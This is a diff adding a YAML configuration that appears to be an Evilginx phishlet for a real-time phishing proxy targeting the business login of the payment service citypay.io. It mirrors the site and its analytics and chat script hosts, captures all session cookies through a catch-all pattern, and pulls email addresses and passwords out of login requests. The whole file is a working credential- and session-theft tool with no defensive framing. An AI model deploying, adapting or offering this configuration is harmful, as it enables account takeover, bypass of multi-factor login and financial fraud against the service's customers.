@@ -1,0 +1,79 @@
+author: '@Evi1Grey5'
+min_ver: '3.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'business', orig_sub: 'business', domain: 'citypay.io', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'googletagmanager.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'cdnjs', orig_sub: 'cdnjs', domain: 'cloudflare.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'unpkg.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'citypay.io', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'cloudflareinsights.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'hotjar.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'mxpnl.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'sc', orig_sub: 'sc', domain: 'lfeeder.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'snid', orig_sub: 'snid', domain: 'snitcher.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'leadinfo.net', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www1', orig_sub: 'www1', domain: 'gstatic.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'script', orig_sub: 'script', domain: 'hotjar.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'collector', orig_sub: 'collector', domain: 'leadinfo.net', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'leadinfo.net', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'content', orig_sub: 'content', domain: 'hotjar.io', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'collector4', orig_sub: 'collector4', domain: 'leadinfo.net', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'js-agent', orig_sub: 'js-agent', domain: 'newrelic.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'js', orig_sub: 'js', domain: 'intercomcdn.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'bam.eu01', orig_sub: 'bam.eu01', domain: 'nr-data.net', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'api-iam', orig_sub: 'api-iam', domain: 'intercom.io', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'nexus-websocket-a', orig_sub: 'nexus-websocket-a', domain: 'intercom.io', session: true, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'business.citypay.io', orig_sub: 'business', domain: 'citypay.io', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'business.citypay.io', orig_sub: 'cdnjs', domain: 'cloudflare.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'business.citypay.io', orig_sub: 'static', domain: 'cloudflareinsights.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  
+  - {triggers_on: 'business.citypay.io', orig_sub: 'www1', domain: 'gstatic.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www1.gstatic.com', orig_sub: 'www1', domain: 'gstatic.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'cdnjs.citypay.io', orig_sub: 'cdnjs', domain: 'cloudflare.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'static.citypay.io', orig_sub: 'static', domain: 'cloudflareinsights.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'www.googletagmanager.com', orig_sub: 'www', domain: 'googletagmanager.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'cdn.citypay.io', orig_sub: 'cdn', domain: 'citypay.io', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'script.hotjar.com', orig_sub: 'script', domain: 'hotjar.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'static.hotjar.com', orig_sub: 'static', domain: 'hotjar.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'content.hotjar.com', orig_sub: 'content', domain: 'hotjar.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'api.leadinfo.net', orig_sub: 'api', domain: 'leadinfo.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'api-iam.intercom.io', orig_sub: 'api-iam', domain: 'intercom.io', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'nexus-websocket-a.intercom.io', orig_sub: 'nexus-websocket-a', domain: 'intercom.io', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'bam.eu01.nr-data.net', orig_sub: 'bam.eu01', domain: 'nr-data.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'collector.leadinfo.net', orig_sub: 'collector', domain: 'leadinfo.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'collector4.leadinfo.net', orig_sub: 'collector4', domain: 'leadinfo.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'cdn.leadinfo.net', orig_sub: 'cdn', domain: 'leadinfo.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'js.intercomcdn.com', orig_sub: 'js', domain: 'intercomcdn.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'cdn.mxpnl.com', orig_sub: 'cdn', domain: 'mxpnl.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'snid.snitcher.com', orig_sub: 'snid', domain: 'snitcher.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+auth_tokens:
+  - domain: 'business.citypay.io'
+    keys: ['.*,regexp']
+
+auth_urls:
+  - '/'
+  - '/dashboard'
+
+credentials:
+  username:
+    key: ''
+    search: '"email":"([^"]*)' 
+    type: 'json'
+  password:
+    key: ''
+    search: '"password":"([^"]*)' 
+    type: 'json'
+
+login:
+  domain: 'business.citypay.io'
+  path: '/login'
+
